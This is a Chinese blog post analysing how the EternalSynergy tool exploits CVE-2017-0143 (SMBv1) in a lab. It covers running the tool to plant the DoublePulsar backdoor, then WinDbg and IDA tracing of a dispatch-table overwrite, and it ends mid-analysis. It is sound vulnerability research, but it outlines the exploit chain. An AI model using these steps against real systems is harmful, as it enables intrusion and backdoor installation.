<!DOCTYPE html>




<html class="theme-next muse" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">





  <meta name="keywords" content="漏洞分析,nsa工具,">





  <link rel="alternate" href="/atom.xml" title="giantbranch's blog" type="application/atom+xml">






<meta name="description" content="环境搭建 把防火墙关闭了就好 安装域控  实验环境及工具如下：  server 2012 sp0 datacenter （装了域控，不是r2版本啊）windbgVirtualKD-3.0wireshark  工具利用复现首先第一次探测的时候做了如下事情：  获取目标系统版本信息 尝试可以访问的管道 探测目标系统的架构（32位还是64位） 还会输出可以利用什么工具，那几个工具的检测代码应该是类似的">
<meta name="keywords" content="漏洞分析,nsa工具">
<meta property="og:type" content="article">
<meta property="og:title" content="Eternalsynergy利用的漏洞分析（CVE-2017-0143）">
<meta property="og:url" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/index.html">
<meta property="og:site_name" content="giantbranch&#39;s blog">
<meta property="og:description" content="环境搭建 把防火墙关闭了就好 安装域控  实验环境及工具如下：  server 2012 sp0 datacenter （装了域控，不是r2版本啊）windbgVirtualKD-3.0wireshark  工具利用复现首先第一次探测的时候做了如下事情：  获取目标系统版本信息 尝试可以访问的管道 探测目标系统的架构（32位还是64位） 还会输出可以利用什么工具，那几个工具的检测代码应该是类似的">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504159419365.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504160814671.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504161665695.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504161729958.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504161774347.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504233064502.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504506477331.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504575263051.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504517835758.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504518930349.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504519080082.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504520475512.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504520667712.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504520702197.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1505371872435.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504577758229.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504577830572.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504578213807.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504578289540.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504579026389.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504579304216.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504579434311.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504579504963.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504579981211.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504581895913.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504589052075.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504592000749.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504590250998.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504592246735.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504592213821.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504592785456.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504593063378.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504593551481.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504593862816.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504595007843.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504596549363.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504669412649.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504685900798.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504686039167.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504686558569.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504774793715.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504776627026.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504833079329.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504833146808.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504833290717.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504833374962.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1505113092152.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1505118127711.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1505119577633.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1505119727358.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1505121860679.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1505122352661.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1505268156659.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1505270562824.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1505368813059.jpg">
<meta property="og:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1505372283620.jpg">
<meta property="og:updated_time" content="2023-10-13T13:14:33.054Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Eternalsynergy利用的漏洞分析（CVE-2017-0143）">
<meta name="twitter:description" content="环境搭建 把防火墙关闭了就好 安装域控  实验环境及工具如下：  server 2012 sp0 datacenter （装了域控，不是r2版本啊）windbgVirtualKD-3.0wireshark  工具利用复现首先第一次探测的时候做了如下事情：  获取目标系统版本信息 尝试可以访问的管道 探测目标系统的架构（32位还是64位） 还会输出可以利用什么工具，那几个工具的检测代码应该是类似的">
<meta name="twitter:image" content="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/images/1504159419365.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.3',
    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/">





  <title>Eternalsynergy利用的漏洞分析（CVE-2017-0143） | giantbranch's blog</title>
  





<script async src="https://www.googletagmanager.com/gtag/js?id=G-SQ8CHXJB60"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-SQ8CHXJB60');
</script>


  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?e3a097ddc6964e154e65d478725ac9ed";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">giantbranch's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">忘掉掌声，按自己的方式，继续前行，跑过一生</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-vulfound">
          <a href="/vulfound/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br>
            
            漏洞挖掘
          </a>
        </li>
      
        
        <li class="menu-item menu-item-book">
          <a href="/book/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
            
            读过的书
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
            
            站点地图
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://www.giantbranch.cn/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="giantbranch">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="giantbranch's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">Eternalsynergy利用的漏洞分析（CVE-2017-0143）</h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-31T08:00:00+08:00">
                2017-08-31
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/08/31/Eternalsynergy利用的漏洞分析（CVE-2017-0143）/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ol>
<li>把防火墙关闭了就好</li>
<li>安装域控</li>
</ol>
<p>实验环境及工具如下：</p>
<blockquote>
<p>server 2012 sp0 datacenter （装了域控，不是r2版本啊）<br>windbg<br>VirtualKD-3.0<br>wireshark</p>
</blockquote>
<h1 id="工具利用复现"><a href="#工具利用复现" class="headerlink" title="工具利用复现"></a>工具利用复现</h1><p>首先第一次探测的时候做了如下事情：</p>
<ol>
<li>获取目标系统版本信息</li>
<li>尝试可以访问的管道</li>
<li>探测目标系统的架构（32位还是64位）</li>
<li>还会输出可以利用什么工具，那几个工具的检测代码应该是类似的</li>
</ol>
<p><img src="./images/1504159419365.jpg" alt=" "></p>
<p>接下来开始漏洞利用，先生成shellcode</p>
<p><img src="./images/1504160814671.jpg" alt="生成shellcode"></p>
<p>之后设置为上面生成shellcode的位置</p>
<p><img src="./images/1504161665695.jpg" alt></p>
<p>最后即可安装后门</p>
<p><img src="./images/1504161729958.jpg" alt></p>
<p>用Doublepulsar检测一下，确实成功了</p>
<p><img src="./images/1504161774347.jpg" alt></p>
<p>根据输出信息，我们可以看到利用步骤如下：</p>
<ol>
<li>利用信息泄露：先找到CONNECTION结构体，之后找到SRV全局指针，最后就找到了 Transaction2Dispatch  tables的位置</li>
<li>查找可执行的内存</li>
<li>复制backdoor shellcode到上面找到的内存</li>
<li>触发stub分配器，覆盖backdoor函数指针</li>
<li>触发 DOUBLEPULSAR的安装</li>
</ol>
<h1 id="初步漏洞分析"><a href="#初步漏洞分析" class="headerlink" title="初步漏洞分析"></a>初步漏洞分析</h1><p>我将shellcode前面都改为CC，跟着windbg就乖乖断下来了，刚好断在shellcode起始位置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; g</span><br><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line">fffffa80`18e2e016 cc              int     3</span><br><span class="line">kd&gt; kv</span><br><span class="line">Child-SP          RetAddr           : Args to Child                                                           : Call Site</span><br><span class="line">fffff880`0580e950 fffffa80`18e2e015 : fffff880`050486cf 00000000`00000005 fffffa80`1dd37a10 00000000`00000000 : 0xfffffa80`18e2e016</span><br><span class="line">fffff880`0580e958 fffff880`050486cf : 00000000`00000005 fffffa80`1dd37a10 00000000`00000000 fffffa80`1a833470 : 0xfffffa80`18e2e015</span><br><span class="line">fffff880`0580e960 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : srv!ExecuteTransaction+0x2cf</span><br><span class="line">kd&gt; dc eip</span><br><span class="line">fffffa80`18e2e016  cccccccc cccccccc cccccccc cccccccc  ................</span><br><span class="line">fffffa80`18e2e026  cccccccc cccccccc cccccccc cccccccc  ................</span><br><span class="line">fffffa80`18e2e036  cccccccc cccccccc cccccccc cccccccc  ................</span><br><span class="line">fffffa80`18e2e046  cccccccc cccccccc cccccccc cccccccc  ................</span><br><span class="line">fffffa80`18e2e056  cccccccc cccccccc cccccccc cccccccc  ................</span><br><span class="line">fffffa80`18e2e066  cccccccc cccccccc cccccccc cccccccc  ................</span><br><span class="line">fffffa80`18e2e076  cccccccc cccccccc cccccccc cccccccc  ................</span><br><span class="line">fffffa80`18e2e086  cccccccc cccccccc cccccccc cccccccc  ................</span><br></pre></td></tr></table></figure>

<p>那bp srv!ExecuteTransaction看看什么情况</p>
<p>第一个包就暂停下来了，应该很多包都会暂停，那先不管</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">srv!ExecuteTransaction:</span><br><span class="line">fffff880`05048400 48895c2408      mov     qword ptr [rsp+8],rbx</span><br><span class="line">kd&gt; kv</span><br><span class="line">Child-SP          RetAddr           : Args to Child                                                           : Call Site</span><br><span class="line">fffff880`04d2c9c8 fffff880`0504e041 : 00000000`00000001 fffff880`04d2ca49 fffffa80`1e2fa470 fffff8a0`0280a10c : srv!ExecuteTransaction</span><br><span class="line">fffff880`04d2c9d0 fffff880`050039a0 : 00000000`00000001 fffffa80`00003f40 fffffa80`000010c0 fffff880`00000004 : srv!SrvSmbNtTransaction+0x6a9</span><br><span class="line">fffff880`04d2cab0 fffff880`05003607 : fffffa80`1e2f9010 fffffa80`1d4d2b90 fffffa80`1e2f9a90 fffff880`0501a158 : srv!SrvProcessSmb+0x230</span><br><span class="line">fffff880`04d2cb20 fffff880`05043572 : fffffa80`1d48a600 fffffa80`1e2f9010 00000000`00000000 fffffa80`1e2f9020 : srv!SrvRestartReceive+0x10f</span><br><span class="line">fffff880`04d2cb60 fffff800`1afb1e3e : fffff8a0`026c70d0 fffffa80`1d48a600 00000000`00000080 fffffa80`1d45fdf0 : srv! ?? ::NNGAKEGL::`string&apos;+0x42ef</span><br><span class="line">fffff880`04d2cbe0 fffff800`1ac40521 : fffffa80`1dd8c400 fffff8a0`026c70d0 fffffa80`1a537218 fffff880`01c028b0 : nt!IopThreadStart+0x26</span><br><span class="line">fffff880`04d2cc10 fffff800`1ac7edd6 : fffff800`1af14180 fffffa80`1dd8c400 fffffa80`1cb23b00 fffffa80`18c5f980 : nt!PspSystemThreadStartup+0x59</span><br><span class="line">fffff880`04d2cc60 00000000`00000000 : fffff880`04d2d000 fffff880`04d27000 00000000`00000000 00000000`00000000 : nt!KxStartSystemThread+0x16</span><br></pre></td></tr></table></figure>

<p>先看看ida看看srv!ExecuteTransaction+0x2cf前一个指令是什么<br>原来是SrvTransaction2DispatchTable里面的函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PAGE:00000000000586C8                 call    rva SrvTransaction2DispatchTable[rdx+rax*8]</span><br></pre></td></tr></table></figure>

<p>这样我就可以大胆推测，应该是改写了这个函数table里面的值</p>
<p>下面为table里面的函数列表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">data:000000000002A920 SrvTransaction2DispatchTable dq offset SrvSmbOpen2</span><br><span class="line">.data:000000000002A920                                         ; DATA XREF: ExecuteTransaction+2C8r</span><br><span class="line">.data:000000000002A928                 dq offset SrvSmbFindFirst2</span><br><span class="line">.data:000000000002A930                 dq offset SrvSmbFindNext2</span><br><span class="line">.data:000000000002A938                 dq offset SrvSmbQueryFsInformation</span><br><span class="line">.data:000000000002A940                 dq offset SrvSmbSetFsInformation</span><br><span class="line">.data:000000000002A948                 dq offset SrvSmbQueryPathInformation</span><br><span class="line">.data:000000000002A950                 dq offset SrvSmbSetPathInformation</span><br><span class="line">.data:000000000002A958                 dq offset SrvSmbQueryFileInformation</span><br><span class="line">.data:000000000002A960                 dq offset SrvSmbSetFileInformation</span><br><span class="line">.data:000000000002A968                 dq offset SrvSmbFindNotify</span><br><span class="line">.data:000000000002A970                 dq offset SrvSmbIoctl2</span><br><span class="line">.data:000000000002A978                 dq offset SrvSmbFindNotify</span><br><span class="line">.data:000000000002A980                 dq offset SrvSmbFindNotify</span><br><span class="line">.data:000000000002A988                 dq offset SrvSmbCreateDirectory2</span><br><span class="line">.data:000000000002A990                 dq offset SrvTransactionNotImplemented</span><br><span class="line">.data:000000000002A998                 dq offset SrvTransactionNotImplemented</span><br><span class="line">.data:000000000002A9A0                 dq offset SrvSmbGetDfsReferral</span><br><span class="line">.data:000000000002A9A8                 dq offset SrvSmbReportDfsInconsistency</span><br></pre></td></tr></table></figure>

<p>我们对bp srv!ExecuteTransaction+0x2c8，即 <code>call    rva SrvTransaction2DispatchTable[rdx+rax*8]</code>下断<br>，执行几次我们就到达了调用shellcode处，可以看到<code>.data:000000000002A990                 dq offset SrvTransactionNotImplemented</code>被覆盖掉了，我们可以在这里下断看看是什么时候被写入的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dqs SrvTransaction2DispatchTable l12</span><br><span class="line">fffff880`0501a920  fffff880`05078240 srv!SrvSmbOpen2</span><br><span class="line">fffff880`0501a928  fffff880`050542fc srv!SrvSmbFindFirst2</span><br><span class="line">fffff880`0501a930  fffff880`05074dcc srv!SrvSmbFindNext2</span><br><span class="line">fffff880`0501a938  fffff880`05057c18 srv!SrvSmbQueryFsInformation</span><br><span class="line">fffff880`0501a940  fffff880`0507708c srv!SrvSmbSetFsInformation</span><br><span class="line">fffff880`0501a948  fffff880`05056bc0 srv!SrvSmbQueryPathInformation</span><br><span class="line">fffff880`0501a950  fffff880`05071140 srv!SrvSmbSetPathInformation</span><br><span class="line">fffff880`0501a958  fffff880`0504be70 srv!SrvSmbQueryFileInformation</span><br><span class="line">fffff880`0501a960  fffff880`0505a000 srv!SrvSmbSetFileInformation</span><br><span class="line">fffff880`0501a968  fffff880`0507745c srv!SrvSmbFsctl</span><br><span class="line">fffff880`0501a970  fffff880`05075370 srv!SrvSmbIoctl2</span><br><span class="line">fffff880`0501a978  fffff880`0507745c srv!SrvSmbFsctl</span><br><span class="line">fffff880`0501a980  fffff880`0507745c srv!SrvSmbFsctl</span><br><span class="line">fffff880`0501a988  fffff880`050730d8 srv!SrvSmbCreateDirectory2</span><br><span class="line">fffff880`0501a990  fffffa80`18e2d010</span><br><span class="line">fffff880`0501a998  fffff880`050796e8 srv!SrvTransactionNotImplemented</span><br><span class="line">fffff880`0501a9a0  fffff880`05069160 srv!SrvSmbGetDfsReferral</span><br><span class="line">fffff880`0501a9a8  fffff880`05068dc4 srv!SrvSmbReportDfsInconsistency</span><br></pre></td></tr></table></figure>

<p>结果发现是SrvSmbTransactionSecondary时调用了memmove</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">srv!memmove+0x2f:</span><br><span class="line">fffff880`0500186f 75ef            jne     srv!memmove+0x20 (fffff880`05001860)</span><br><span class="line">kd&gt; kv</span><br><span class="line">Child-SP          RetAddr           : Args to Child                                                           : Call Site</span><br><span class="line">fffff880`058d1a18 fffff880`0507e384 : fffffa80`1e325470 fffffa80`1e324010 fffffa80`1e325450 00000000`00000001 : srv!memmove+0x2f</span><br><span class="line">fffff880`058d1a20 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : srv!SrvSmbTransactionSecondary+0x2d4</span><br></pre></td></tr></table></figure>

<p>是在下面这里</p>
<p><img src="./images/1504233064502.jpg" alt></p>
<p>那么就是利用这里进行任意地址的写操作，到这了没什么思路，到底具体是什么原因导致这里任意地址写呢</p>
<p>我们从最开始分析吧</p>
<h1 id="判断系统位数"><a href="#判断系统位数" class="headerlink" title="判断系统位数"></a>判断系统位数</h1><p>通过发送bind，看看收到的bind ack那里来确定系统位数</p>
<p><img src="./images/1504506477331.jpg" alt></p>
<p>也可以看到攻击端是32位的</p>
<p><img src="./images/1504575263051.jpg" alt></p>
<h1 id="信息泄露数据包体现"><a href="#信息泄露数据包体现" class="headerlink" title="信息泄露数据包体现"></a>信息泄露数据包体现</h1><p><img src="./images/1504517835758.jpg" alt="获取到了CONNECTION结构的地址"></p>
<ol>
<li><p>发了好多Trans Request，MID是递增的，所以应该在内存构建了多个相邻的transaction</p>
</li>
<li><p>获取到了CONNECTION结构的地址后就用这地址去发送Request，这里的数据包是嵌套了很多smb数据，其中我们的<br>CONNECTION struct: 0xFFFFFA801D4D3B90 是在第3个smb里面（不算第一个的话）</p>
</li>
</ol>
